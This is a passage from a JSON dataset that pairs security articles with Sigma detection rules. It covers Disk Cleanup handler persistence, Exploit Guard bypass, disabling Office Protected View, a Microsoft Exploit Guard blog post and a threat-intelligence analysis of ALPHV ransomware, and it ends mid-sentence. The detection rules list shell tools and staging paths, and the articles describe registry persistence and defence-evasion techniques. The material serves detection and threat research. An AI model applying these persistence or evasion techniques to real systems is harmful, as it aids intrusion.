---------------------------------------------------------\n  (Default)               REG_SZ     {C0E1361-0CC6-11d1-BBB6-0060978B2AE6}\n  CleanupString           REG_SZ     c:\\WINDOWS\\system32\\mspaint.exe\n  Filelist                REG_SZ     *.foo\n  Flags                   REG_DWORD  0x0000007d (125)\n  Folder                  REG_SZ     c:\\test\n  PreCleanupString        REG_SZ     c:\\windows\\system32\\notepad.exe\n  StateFlags              REG_DWORD  0x00000001 (1)\n  Autorun                 REG_DWORD  0x00000001 (1)\n```\n\n---\n\nThis entry was posted in Anti-Forensics, Autostart (Persistence).",
    "sigma_rule": {
      "title": "Persistence Via Disk Cleanup Handler - Autorun",
      "id": "d4e2745c-f0c6-4bde-a3ab-b553b3f693cc",
      "status": "test",
      "description": "Detects when an attacker modifies values of the Disk Cleanup Handler in the registry to achieve persistence via autorun.\nThe disk cleanup manager is part of the operating system.\nIt displays the dialog box […] The user has the option of enabling or disabling individual handlers by selecting or clearing their check box in the disk cleanup manager's UI.\nAlthough Windows comes with a number of disk cleanup handlers, they aren't designed to handle files produced by other applications.\nInstead, the disk cleanup manager is designed to be flexible and extensible by enabling any developer to implement and register their own disk cleanup handler.\nAny developer can extend the available disk cleanup services by implementing and registering a disk cleanup handler.\n",
      "references": [
        "https://persistence-info.github.io/Data/diskcleanuphandler.html",
        "https://www.hexacorn.com/blog/2018/09/02/beyond-good-ol-run-key-part-86/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-07-21",
      "modified": "2023-08-17",
      "tags": [
        "attack.persistence"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "root": {
          "TargetObject|contains": "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VolumeCaches\\"
        },
        "selection_autorun": {
          "TargetObject|contains": "\\Autorun",
          "Details": "DWORD (0x00000001)"
        },
        "selection_pre_after": {
          "TargetObject|contains": [
            "\\CleanupString",
            "\\PreCleanupString"
          ],
          "Details|contains": [
            "cmd",
            "powershell",
            "rundll32",
            "mshta",
            "cscript",
            "wscript",
            "wsl",
            "\\Users\\Public\\",
            "\\Windows\\TEMP\\",
            "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
          ]
        },
        "condition": "root and 1 of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_disk_cleanup_handler_autorun_persistence.yml",
    "id": "951"
  },
  {
    "url": "https://www.microsoft.com/en-us/security/blog/2017/10/23/windows-defender-exploit-guard-reduce-the-attack-surface-against-next-generation-malware/",
    "markdown": "# Windows Defender Exploit Guard: Reduce the attack surface against next-generation malware\n\n**Published**: October 23, 2017\n\nWindows Defender Exploit Guard is a new set of intrusion prevention capabilities that ships with the Windows 10 Fall Creators Update. The four components of Windows Defender Exploit Guard are designed to lock down the device against a wide variety of attack vectors and block behaviors commonly used in malware attacks, while enabling enterprises to balance their security risk and productivity requirements.\n\nTraditional antivirus technologies are an integral aspect of the endpoint security stack through the identification and removal of malicious executables using a combination of cloud-based machine learning and heuristics. Despite advances in antivirus detection capabilities, attackers are continuously adapting and have been expanding their arsenal of tricks and techniques to compromise endpoints, steal credentials, and execute ransomware attacks without ever needing to write anything to disk. This emerging trend of fileless attacks, which compose over 50% of all threats, are extremely dangerous, constantly changing, and designed to evade traditional AV. Fileless attacks have two types: those that use non-traditional executable files (e.g., documents with active content in them), and those that exploit vulnerabilities.\n\nWindows Defender Exploit Guard utilizes the capabilities of the Microsoft Intelligent Security Graph (ISG) and the world-class security research team at Microsoft to identify active exploits and common behaviors to stop these types of attacks at various stages of the kill chain. Although the underlying vulnerability being exploited varies, the delivery mechanism differs, and the payload changes, there is a core set of behaviors and vectors that many different attacks adhere to. By correlating streams of events to various malicious behaviors with the ISG, Windows Defender Exploit Guard provides the capability and controls needed to handle these types of emerging threats.\n\n## The four components of Windows Defender Exploit Guard are:\n\n1. **Attack Surface Reduction (ASR)**: A set of controls that enterprises can enable to prevent malware from getting on the machine by blocking Office-, script-, and email-based threats.\n2. **Network protection**: Protects the endpoint against web-based threats by blocking any outbound process on the device to untrusted hosts/IP through Windows Defender SmartScreen.\n3. **Controlled folder access**: Protects sensitive data from ransomware by blocking untrusted processes from accessing your protected folders.\n4. **Exploit protection**: A set of exploit mitigations (replacing EMET) that can be easily configured to protect your system and applications.\n\n---\n\n## Attack Surface Reduction (ASR): Intelligence to control the surface area of the device\n\nEmail and Office applications are generally thought of as keystones of enterprise productivity, yet they are the most common vector for attacks and can cause nightmares for security administrators. Both Office and email serve as simple and easy ways to distribute mechanism for bad actors to kick off malware and fileless attacks. Although Office macros and scripts have many productive use cases, malicious actors can use them to directly perform exploits that operate entirely in memory and are often undetectable by traditional AV techniques.\n\nAttack Surface Reduction provides enterprises with a set of built-in intelligence that can block the underlying behaviors used by these malicious documents to execute without hindering productive scenarios. By blocking malicious behaviors independent of what the threat or exploit is, ASR can protect enterprises from never before seen zero-day attacks like the recently discovered CVE-2017-8759, CVE-2017-11292, and CVE-2017-11826.\n\nThe different behaviors ASR provides coverage for in Fall Creators Updated are split among Office, scripts, and email.\n\nFor Office apps, ASR can:\n\n- Block Office apps from creating executable content\n- Block Office apps from launching child process\n- Block Office apps from injecting into process\n- Block Win32 imports from macro code in Office\n- Block obfuscated macro code\n\nFor script, ASR can:\n\n- Block malicious JavaScript, VBScript, and PowerShell codes that have been obfuscated\n- Block JavaScript and VBScript from executing payload downloaded from internet\n\nFor email, ASR can:\n\n- Block execution of executable content dropped from email (webmail/mail-client)\n\n---\n\n## Network protection: Blocking outbound connection\n\nThe internet is home to a swath of malicious websites that are designed to lure and trick users. They use phishing, deceptive ads, tech scams, social engineering, and other means as part of their campaigns. For some attacks, they seek to acquire information or get immediate financial payout, while others may attempt to install malware on the machine.\n\nWindows Defender SmartScreen protects Microsoft Edge from socially engineered malware, phishing, and other web-based threats through the power of the Intelligent Security Graph (ISG). This has made Microsoft Edge one of the most secure browsers out there, outperforming Chrome and Firefox in NSS Lab’s recent test results for phishing protection between August 23 and September 12, 2017.\n\nWindows Defender Exploit Guard’s network protection capability utilizes this same intelligence from ISG to vet, and if necessary block, all outbound connections before they are made. This brings the same level of protection that we previously just had for Microsoft Edge across the entire system and network stack.\n\n---\n\n## Controlled folder access\n\nEncryption of files by ransomware and other unauthorized apps means losing control of your data: documents, precious photos and videos, and other important files. For enterprises and small businesses, losing access to files can mean disrupted operations. Controlled folder access protects files by locking down critical folders, allowing only authorized apps to access files. Unauthorized apps, including malicious and suspicious executable files, DLLs, scripts, and others will be denied access even when they are running with the user’s or administrator’s privilege, which malware is often be able to secure.\n\nBy default, Controlled folder access protects common folders where documents and other important data are stored, but it’s also flexible. You can add additional folders to protect, including those on other drives. You can also allow apps that you trust to access protected folders, so if you’re using unique or custom app, your normal everyday productivity will be not affected.\n\n---\n\n## Exploit Protection\n\nWindows Defender Exploit Guard’s exploit protection represents the suite of vulnerability mitigation and hardening techniques that are built directly into Windows 10. As you install the Fall Creators Update, the appropriate mitigation settings will already be configured and applied on the machine.\n\n### Rest In Peace (RIP) EMET\n\nUsers of the Enhanced Mitigation Experience Toolkit (EMET) will notice that it was automatically uninstalled from your machine during the upgrade. This is because WDEG includes the best of EMET built directly into Windows 10, so it’s now just part of the platform. You can the find previous user experiences for configuring EMET vulnerability mitigation capabilities in Windows Defender Security Center. For more information, read Moving Beyond Emet II – Windows-Defender-Exploit-Guard.\n\nIt is important to note that Exploit Guard’s exploit protection accepts a different format for the mitigation configuration than EMET did. To make the process of migrating to Exploit Protection and Windows Defender Exploit Guard easier, there is a PowerShell module that converts EMET XML settings files into Windows 10 mitigation policies for Exploit Guard. This PowerShell module also provides an additional interface for Windows Defender Security Center to configure its mitigation settings.\n\n---\n\n## Windows Defender Exploit Guard manageability\n\nAll the Windows Defender Exploit Guard components are manageable by Group Policy (GP), System Center Configuration Manager (SCCM), and Mobile Device Management (MDM) such as Microsoft Intune.\n\nAll components support running in both Audit and Block modes. When Block mode is enabled and a corresponding malicious behavior is observed, Windows Defender Exploit Guard blocks the event from occurring in real-time. Block events for Attack Surface Reduction, Controlled folder access and Network Protection surface a notification toast to the endpoint in real-time as well as an event log, and can be centrally viewed by security operations personnel in the Windows Defender Advanced Threat Protection (Windows Defender ATP) console.\n\n---\n\n## Windows Defender Advanced Threat Protection\n\nWindows Defender ATP provides a single pane of glass experience for managing and viewing all the security feeds and events happening on managed endpoints across the enterprise. With Windows Defender ATP, the entire process tree execution can be seen for Exploit Guard events, making it extremely easy to determine what happened, such that a proper response can be executed.\n\n---\n\nIn the end, Windows Defender Exploit Guard is one of the most important new defenses that we’ve added to Windows 10 in the Fall Creators Update. In many ways, it completes our stack for preventive protection. Organizations that deploy it alongside Windows Defender Antivirus will find that they have a highly effective and differentiated solution for addressing modern fileless attacks and host intrusion. We recommend you evaluate it at the earliest opportunity and we look forward to your feedback.\n\nTo test how Windows Defender ATP can help your organization detect, investigate, and respond to advanced attacks, **sign up for a free trial**.\n\n---\n\n### Learn more about Windows 10 Fall Creators Update\n\n- Microsoft 365 Security and Management Features Available in Fall Creators Update\n- Windows Defender Exploit Guard: Reduce the attack surface against next-generation malware\n- Stopping ransomware where it counts: Protecting your data with Controlled folder access\n- Making Microsoft Edge the most secure browser with Windows Defender Application Guard\n- Introducing Windows Defender Application Control\n- Hardening the system and maintaining integrity with Windows Defender System Guard\n- Move away from passwords, deploy Windows Hello. Today!\n- What’s new in Windows Defender ATP Fall Creators Update\n- Antivirus evolved",
    "sigma_rule": {
      "title": "Suspicious Application Allowed Through Exploit Guard",
      "id": "42205c73-75c8-4a63-9db1-e3782e06fda0",
      "status": "test",
      "description": "Detects applications being added to the \"allowed applications\" list of exploit guard in order to bypass controlled folder settings",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2017/10/23/windows-defender-exploit-guard-reduce-the-attack-surface-against-next-generation-malware/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-08-05",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection_key": {
          "TargetObject|contains": "SOFTWARE\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Controlled Folder Access\\AllowedApplications"
        },
        "selection_paths": {
          "TargetObject|contains": [
            "\\Users\\Public\\",
            "\\AppData\\Local\\Temp\\",
            "\\Desktop\\",
            "\\PerfLogs\\",
            "\\Windows\\Temp\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_exploit_guard_susp_allowed_apps.yml",
    "id": "957"
  },
  {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md",
    "markdown": "",
    "sigma_rule": {
      "title": "Microsoft Office Protected View Disabled",
      "id": "a5c7a43f-6009-4a8c-80c5-32abf1c53ecc",
      "related": [
        {
          "id": "7c637634-c95d-4bbf-b26c-a82510874b34",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects changes to Microsoft Office protected view registry keys with which the attacker disables this feature.",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md",
        "https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/",
        "https://yoroi.company/research/cyber-criminal-espionage-operation-insists-on-italian-manufacturing/",
        "https://admx.help/HKCU/software/policies/microsoft/office/16.0/excel/security/protectedview"
      ],
      "author": "frack113, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-06-08",
      "modified": "2023-08-17",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection_path": {
          "TargetObject|contains|all": [
            "\\SOFTWARE\\Microsoft\\Office\\",
            "\\Security\\ProtectedView\\"
          ]
        },
        "selection_values_1": {
          "Details": "DWORD (0x00000001)",
          "TargetObject|endswith": [
            "\\DisableAttachementsInPV",
            "\\DisableInternetFilesInPV",
            "\\DisableIntranetCheck",
            "\\DisableUnsafeLocationsInPV"
          ]
        },
        "selection_values_0": {
          "Details": "DWORD (0x00000000)",
          "TargetObject|endswith": [
            "\\enabledatabasefileprotectedview",
            "\\enableforeigntextfileprotectedview"
          ]
        },
        "condition": "selection_path and 1 of selection_values_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_office_disable_protected_view_features.yml",
    "id": "976"
  },
  {
    "url": "https://www.intrinsec.com/alphv-ransomware-gang-analysis/?cn-reloaded=1",
    "markdown": "# ALPHV ransomware gang analysis\n\nJan 26, 2022\n\n**ALPHV** (or **BlackCat or Noberus**) **ransomware** emerged only **last December** and is already considered as a **genuine threat** that blue teams should be ready to fight against while little is known on the employed entry vector(s).\n\nThis conjecture relies not only on the **high level of developing skills** required to build such **peculiar ransomware payloads and dedicated leak sites** but also more **resilient and secure architecture**; the number of high-profile victims is already growing **at a fast pace** and could keep switching between **big and mid game hunting** in the coming months/years. Moreover, though not yet proven, **ALPHV** intends to embrace **a triple extortion scheme** by launching **DDoS** towards victims’ assets if the ransom is not paid.\n\nAs far as the threat **genealogy** is concerned, **Darkweb forum analysis** allows us to conjecture that at least one actor (affiliate and/or operator and/or web developer) with recent or past ties to **Darkside/BlackMatter/REvil** decided to jump into a new **RaaS** program referred to as **ALPHV**. In addition, we found that another actor could have been somewhat involved in the **LockBit** and/or the **ALPHV RaaS program**. After pivoting from its avatar, we found with medium high confidence that the ransomware brand was inspired by a cult Russian movie where the **Black Cat** gang leaves a cat drawing or an actual cat at the scene of the crime.\n\nLast but not least, we found a running tool being leveraged by affiliates of **ALPHV** to download and run payloads upon an attack, from a remote server, which possesses strong code overlap with the **LockBit’s** running tool.\n\nAt the end of the document, we provide **actionable intelligence to strengthen relevant layers of defences** seeking to reduce or pre-empt the impact of this emerging threat.\n\n## Table of contents\n\n- Intrusion Set\n  - Description/Chronology\n  - Aliases\n  - Primary motivation\n  - Goals\n  - Targets (identity, location or vulnerability)\n  - Attribution/Genealogy\n- Analysis\n  - Frontend and backend analysis of DLS\n  - Analysis of the ransomware-as-a-service program\n  - Commonalities between LockBit2.0 and ALPHV\n  - TTPs\n  - Malware(s)/Tool(s)\n  - Vulnerabilities\n  - Course of action\n- References\n- Appendix\n  - Malware information\n  - Threat actor\n  - FAQ dedicated to its affiliates (published on the public DLS of ALPHV)\n  - Domain analysis of the ALPHV’s infrastructure\n\n## Intrusion Set\n\n### Description/Chronology\n\nTo the best of our knowledge, the first attack that deployed **ALPHV RaaS** was reported by Symantec. Three variants in total hit hundreds of machines on **November 18, 2021** while the first **suspicious** network activity had been **observed on November 3**.\n\n### Aliases\n\nThe group is referred to as **ALPHV** and is also known as **BlackCat** (because of a black cat icon set by the group in the first version of their dedicated leak site) or **Noberus** (by Symantec).\n\n### Primary motivation\n\n**Financial gains**\n\n### Goals\n\n**ALPHV** aims at stealing confidential information, encrypting files and then demanding a ransom that needs to be paid, otherwise threat actors publish the collected information or sell it to interested third parties.\n\n### Targets (identity, location or vulnerability)\n\nThe array below presents known victims hit by **ALPHV** ransomware; please note that it is usually an underestimated list. Upon our analysis we already found some probable victims that remained under the scope of the cybersecurity community so far. From the limited amount of data available one can highlight that, as it is commonly observed, the most targeted countries are primarily American and then European. Another common trait also emerging here is the almost indiscriminate type of sector being targeted.\n\n| **Victim**                             | **Country**              | **Sector**                          | **Date**         |\n| -------------------------------------- | ------------------------ | ----------------------------------- | ---------------- |\n| Content available in a Private release | Romania                  | Heavy industries                    | 23 January 2022  |\n| Content available in a Private release | UK                       | Financial organizations             | 18 January 2022  |\n| Content available in a Private release | Italy                    | Retail                              | 17 January 2022  |\n| Content available in a Private release | United States of America | Construction                        | 17 January 2022  |\n| Content available in a Private release | United States of America | Financial organizations             | 16 January 2022  |\n| Content available in a Private release | China                    | Heavy industries                    | 16 January 2022  |\n| Content available in a Private release | United States of America | Heavy industries                    | 16 January 2022  |\n| Content available in a Private release | Bahamas                  | Local administrations               | 07 January 2022  |\n| Content available in a Private release | United States of America | Food and drinks businesses          | 01 January 2022  |\n| Content available in a Private release | Netherlands              | Insurance services                  | 01 January 2022  |\n| Content available in a Private release | Germany                  | Technologies                        | 01 January 2022  |\n| Content available in a Private release | United States of America | Information technologies consulting | 31 December 2021 |\n| Content available in a Private release | United States of America | Financial organizations             | 29 December 2021 |\n| Content available in a Private release | United States of America | Information technologies consulting | 29 December 2021 |\n| Content available in a Private release | Australia                | Manufacturing                       | 29 December 2021 |\n| Content available in a Private release | United States of America | Technologies                        | 29 December 2021 |\n| Content available in a Private release | Canada                   | Energy                              | 29 December 2021 |\n| Content available in a Private release | France                   | Transportation Services             | 27 December 2021 |\n| Content available in a Private release | Puerto Rico              | Food and drinks businesses          | 24 December 2021 |\n| Content available in a Private release | Spain                    | Pharmacy and drugs manufacturing    | 25 December 2021 |\n| Content available in a Private release | United States of America | Technologies                        | 22 December 2021 |\n| Content available in a Private release | France                   | Information technologies consulting | 19 December 2021 |\n| Content available in a Private release | Germany                  | Transportation Services             | 19 December 2021 |\n| Content available in a Private release | Unknown                  | Unknown                             | 17 December 2021 |\n| Content available in a Private release | Philippines              | Retail                              | 14 December 2021 |\n| Content available in a Private release | United States of America | Mining                              | 10 December 2021 |\n| Content available in a Private release | United States of America | Engineering consulting              | 08 December 2021 |\n\n### Attribution/Genealogy\n\nAttribution of the intrusion set is at first glance contradictory, as on one hand, according to Recorded Future experts, the operator of **ALPHV** had been previously a member of the well-known ransomware group **REvil**; while on the other hand, according to the official LockBit Support account on the Russian Cybercrime forum XSS, the **ALPHV** is a rebranding of **Darkside / BlackMatter** ransomware brands (see Figure 1).\n\n```image\nAlt: LockBit Support Post\nDescription: The image is a screenshot of a post from the LockBit Support account on a cybercrime forum. It shows the LockBit logo prominently at the top, indicating it's a premium account. Below the logo, the post includes a date (Dec 10, 2021) and text suggesting speculation about a rebranding of a ransomware group, referencing Darkside and BlackMatter. The user interaction is visible, including a comment by another user that adds to the discussion regarding the identity of the group in question.\nTranscription: |\n  Dec 10, 2021\n  LockBitSupp\n  Premium\n  Joined : Mar 8, 2021\n  Messages : 258\n  Reaction score : 335\n  \n  ibenji said:\n  I guess who it might be)\n  \n  This dark / blackmater decided to make another rebranding.\n```\n\n*Figure 1: Screenshot of a post by the official LockBit Support, 2nd most impactful ransomware gang claiming that ALPHV operator was a former member of Darkside / BlackMatter, ransomware brands.*\n\n**ALPHV** operator was also seen replying to a troll feed on **XSS** forum targeting **LockBit** (see Figure 2), which could indicate that they are competitors. **ALPHV** owns a business-oriented premium account that costs about one hundred dollars per year, which shows the intention of the latter to weigh into the **RaaS** landscape.\n\n```image\nAlt: ALPHV Operator Reply\nDescription: The image displays a screenshot from a cybercrime forum, featuring the profile of a user named 'alphv' who joined on December 4, 2021. The profile indicates that 'alphv' is a premium member with a single message and no avatar. Adjacent to this profile is a post dated December 8, 2021, by another user named 'Kelegen,' mentioning the Lockbit 2.0 ransomware group and stating 'Pwned by Dmitry' along with a visual label indicating a countdown until files are published, highlighting leaked data related to the LockBit group.\nTranscription: |\n  | User  | Joined      | Messages | Reaction Score | Status       |\n  | ----- | ----------- | -------- | -------------- | ------------ |\n  | alphv | Dec 4, 2021 | 1        | 0              | Premium      |\n  |       | Dec 9, 2021 |          |                | Brilliantly. |\n  \n  | User    | Joined       | Messages | Reaction Score | Status                                       |\n  | ------- | ------------ | -------- | -------------- | -------------------------------------------- |\n  | Kelegen | Aug 17, 2021 | 639      | 223            | Premium                                      |\n  |         | Dec 8, 2021  |          |                | Lockbit 2.0 Ransomware group with a new post |\n  |         |              |          |                | \"Pwned by Dmitry ....\"                       |\n```\n\n*Figure 2: On the left, a screenshot taken on December 28, 2021 from a random channel of the Russian cybercrime Forum XSS. ALPHV operator replied to the trolling post of another user named Kelegen (on the right) claiming that the LockBit Dedicated Leak Site was pwned. The premium account ‘ALPHV’ was created on December 9, 2021 and has posted so far only this short message.*\n\nAn analysis from **Korean Threat Intelligence** S2W Lab company pinpointed that like other **RaaS** ransomgangs, a config file is leveraged as an input to endow the ransomware with custom features tailored for the victims (see Analysis for details). Of note is the strong overlap with the config file previously used by **BlackMatter**. From the timeline provided by **S2W** though, they conclude that it would have been too soon for **ALPHV** to rebrand from **BlackMatter** while rewriting from scratch a DLS (Dedicated Leak Site) and a **RUST**-based ransomware. This could substantiate at the first glance an attribution to the **REvil** ransom cartel whom first shutdown occurred in July 2021 and then was hacked and forced offline after a comeback since the end of October this year but there is too little material at the time of writing to conclude.\n\nAs far as **BlackMatter** is concerned however, technical evidences such as the encryption routine study and code similarities show that **BlackMatter** signed the come-back of **Darkside** core teams. This revival took place at the moment of **Darkside**’s disappearance following its infamous **Colonial Pipeline** major attack. We shall then recall the genesis of **Darkside**, which was born in August 2020 when pentesters first rented **REvil RaaS** (operated by **Pinchy Spider**) until **Carbon Spider** operated its own variant based on the code of **REvil** that became **Darkside**. To conclude on that first part, we thus underline past ties between **Revil** and **Darkside** as well as more recently between **Darkside** and **BlackMatter**.\n\nAs far as the ransomware code is concerned we shall underline that **BlackMatter** is a mashup between LockBit, Darkside, and REvil.\n\nA possible scenario would be that at least one actor (affiliate and/or operator and/or web developer) with recent or past ties to **Darkside/BlackMatter/REvil** decided to jump into a new **RaaS** program referred to as **ALPHV**, but this assumption remains speculative at this stage.\n\nFrom another interesting conversation on the **RAMP** forum about the withdrawal of **BlackMatter** and assumptions on their next move, an avatar named BlackCat46 also aroused our interest (see Figure 3).\n\n```image\nAlt: BlackCat46 Avatar\nDescription: The image is a screenshot from a Russian cybercrime forum showing a conversation thread about the identity of a hacker believed to have ties to the REvil group. It includes a post from a user named 'LockBitSupp' claiming to know the identity of the hacker, followed by responses from other users speculating about the identity. The post features user avatars, message counts, and reaction scores, indicating the participants' engagement in the discussion.\nTranscription: |\n  Dec 10, 2021\n  LockBitSupp\n  Premium\n  Joined: Mar 8, 2021\n  Messages: 258\n  Reaction score: 335\n  And I know who he is)\n  \n  BlackCat46\n  Премиум\n  Messages: 22 · Reaction score: 2\n  \n  Dec 10, 2021\n  ibenji\n  RAID array\n  User\n  Joined: Jun 17, 2019\n  Messages: 62\n  Reaction score: 43\n  LockBitSupp said:\n  And I know who he is)\n  was previously a member of the well-known hacker group REvil\n  I guess who it might be)\n```\n\n*Figure 3: Screenshot taken from Russian cybercrime XSS forum, displaying that LockBit claims to know the operator of ALPHV, a former member of the infamous REvil group, and that BlackCat46 liked this assumption. Its avatar on XSS and Exploit, both major Russian-speaking cybercrime forums, represent a picture of the famous Russian revolutionary LENIN taken in Gorki where he spent the last year of his life.*\n\nThis could show that the latter has a particular interest in **BlackMatter** and a kind of ‘friendship’ with the **LockBit** operator; at the very least, a cross-analysis of its avatar content shows a particular tropism for **RaaS** programs.\n\nIn addition to that, the most recent avatar on **RAMP** of BlackCat46 is an angry cat, which obviously reminds the free black cat icon that was chosen by **ALPHV** for private onion negotiation sites (also angry). By reverse image search analysis, we found its **RAMP** avatar on an entertainment website) illustrating a 1979 cult film upon the Former Soviet Union called ‘The Meeting Place Cannot Be Changed.’ The plot synopsis is not without remembering what could experience members of **RaaS** programs in which a gang of armed robbers calling itself « The **Black Cat** » keeps evading capture. Even more striking is the bleeding knife website **icon** used for the crime investigation category that turns out to be the very same used on the public DLS of **ALPHV** (see Figure 4). We retrieved the link between those two observed website icons by **ALPHV** on their Private and Public DLS.\n\n```image\nAlt: BlackCat46 Avatar\nDescription: The image consists of two parts: the left side displays a user profile from the RAMP forum for the user named 'BlackCat46.' It shows their profile picture, which is a simplistic drawing of a cat, along with user details such as the number of messages and dates of account creation and last visit. The right side features a webpage titled \"Чёрная кошка (банда),\" which translates to \"Black Cat (Gang),\" accompanied by a similar cat drawing. This layout suggests a connection between the user BlackCat46 and the thematic representation of a 'Black Cat' gang, which is relevant to the context provided about RaaS programs and the analysis of cybercrime activities.\nTranscription: |\n  RAMP\n  Forums  What's new\n  Members\n  \n  Current visitors  New profile posts  Search profile posts\n  \n  BlackCat46\n  Messages  2\n  Joined: Nov 10, 2021  Last seen: Nov 17, 2021\n  \n  Чёрная кошка (банда)\n```\n\n*Figure 4: On the left, the profile of BlackCat46 on RAMP forum. On the right, an illustration obtained by reverse image analysis of the BlackCat46 avatar on RAMP forum linked to a cult Russian movie where the Black Cat gang leaves a cat drawing or an actual cat at the scene of the crime. The knife icon of the website used for the crime investigation category matches the one used by ALPHV on their Public DLS.*\n\nBased on topics and conversations in which *BlackCat46* is involved, we think that his profile could fit the one of an affiliate being involved in **RaaS** program with pentesting skills. More interesting is that the latter requested help to protect against DDOS attacks on the aforementioned Russian cybercrime forum known as **‘Exploit’** (with the same Lenin avatar picture and account name *BlackCat46* than was observed on **XSS**). This recalls the fact that **ALPHV** named and shamed **LockBit**, which recently suffered **DDOS** attacks right after the latter defrayed the chronicle by leaking very sensitive data of **Accenture** on their centralized DLS reachable by a unique onion domain. It is assumed that the hack back was triggered by victims’ third parties assisting with incident response and/or US agencies according to **LockBit** operator. As a result, one could conjecture that *BlackCat46* could have been somewhat involved into the **LockBit** **RaaS** program and/or the **ALPHV** one to avoid being hacked back by **DDoS** attacks.\n\n## Analysis\n\n### Frontend and backend analysis of DLS\n\nS2W Lab also showed that the **frontend** developing was carried out in three stages. First, a Private Leak Site was used (now down) that became a unique Public Dedicated Leak Site (DLS) while negotiation site are unique per victim. For this, a UUID is generated via the command:\n\n*cmd /c wmic csproduct get UUID*\n\nThis command is used to generate an access key being required to reach the correct URL following this scheme:\n\n*`hxxp://Av3TorUniqueHiddenWebAddress[.]onion/?access-key=${ACCESS_KEY}`*\n\n**As far as the Public Leak Site of** **ALPHV** is concerned, its technology relies for the frontend on Angular, which enhances users experience with single page applications. This extensively used open source framework is coupled to **zone.js** to reduce UI refreshing when change detection occurs.\n\nFrom our experience, this web technology is not often encountered and translates good skills in terms of web developing. The web developer could be a dedicated person and not necessarily the operator maintaining in operational conditions the infrastructure. As a result, an automated survey of their Public Dedicated Leak Site (**DLS**) by CTI teams is more difficult. Fortunately we found a workaround to provide information on victims that can be ingested in an automated way:\n\n*Content available in the Private release*\n\n**Concerning the backend**, this group claims to have learned from other ransom-cartels’ mistakes such as **Conti**, which recently saw their servers uncovered by the Prodaft Threat Intel team. Also peculiar is the generation of **a unique onion domain per each new company** hit by **ALPHV** ransomware. This change of modus operandi was most likely driven by the intention to reduce the impact of the aforementioned **DDOS** attack.\n\n**ALPHV** offer an intricate affiliate program (see appendix) with self-deletion scripts, a built-in Bitcoin mixer integrated, which does not communicate with the ALPHV infrastructure backend. The latter is fragmented into nodes that are interconnected through a whole network of pads within the onion network being behind a Network Address Translation (NAT) so genuine IP addresses are not directly accessible from the internet and are protected by a firewall.\n\n### Analysis of the Ransomware-as-a-service program\n\nSince early December 2021, the operator of **ALPHV** has been promoting its **RaaS** program on the underground Russian forums **RAMP** (see an English translation in appendix) inviting other criminals to join ransomware attacks against large companies. The operator mentioned later that only Russian speaking affiliate could join the program either by payment or by skill. It is worth mentioning though that overall, more and more Chinese translations are found on underground forums in a sort of an objective alliance between countries of Commonwealth of Independent States and China black hats against western countries. The operator claims that the malware can encrypt data on systems running Windows, Linux and VMware ESXi, and partners will receive 80% to 90% of the final ransom, depending on the total amount received from the victims.\n\n```image\nAlt: ALPHV Operator on RAMP\nDescription: The image is a screenshot of the RAMP underground forum showing search results related to the ALPHV ransomware gang's affiliate program. It displays several posts discussing the program's new generation, highlighting a focus on Russian-speaking and skillful participants. The posts date from December 2021, emphasizing the program's recruitment efforts and some introductory messages regarding the advantages of the program.\nTranscription: |\n  RAMP\n  \n  Search results\n  \n  Search\n  \n  ALPHV-ng RaaS new generation.\n  If the team has Russian-speaking and skillful guys, let's take it)\n  - Post #11 - Dec 15, 2021 - Forum: Partners Program \\ RaaS \\ Partner Program\n  \n  ALPHV-ng RaaS new generation.\n  We do not take English speakers.\n  - Post #7 - Dec 13, 2021 - Forum: Partners Program \\ RaaS \\ Partner Program\n  \n  ALPHV-ng RaaS new generation.\n  INTRO We are glad to welcome you to our affiliate program. We have taken into account all the advantages and disadvantages of previous partner programs and are proud to bring you ALPHV - the next generation of ransomware. All software is written from scratch, the decentralization of all web resources is architecturally laid down. For...\n  - Thread - Dec 9, 2021 - Replies: 16 - Forum: Partners Program \\ RaaS \\ Partner Program\n```\n\n*Figure 5: ALPHV operator named RANSOM joined the RAMP forum the 8th December, 2021 and depicted the day after its RaaS affiliate program. RAMP is a Russian-speaking underground forum that was launched in July 2021. The operator of RAMP was linked to the operator of Babuk and Payload.bin. N.B: we translated this page into English.*\n\n**ALPHV** operators were also seen on another underground Russian forum known as **Exploit** (see Figure 6) where they were actively recruiting pentesters specialized in Windows/Linux and ESXi. In the same post, they shared two TOX addresses and a jabber address to discuss in a secure environment.\n\n```image\nAlt: ALPHV Recruiting\nDescription: The image is a screenshot from an underground forum post by a user named 'alphv' dated December 4, 2021. The post solicits experienced pentesters for Windows, Linux, and ESXi systems. It includes contact information via TOX and Jabber for interested candidates to reach out for details. The layout displays a basic forum format with the user's registration details, activity type (virology/malware), and a call for collaboration in cybercriminal activities.\nTranscription: |\n  We are looking for WINDOWS / LINUX / ESXI pentesters\n  By 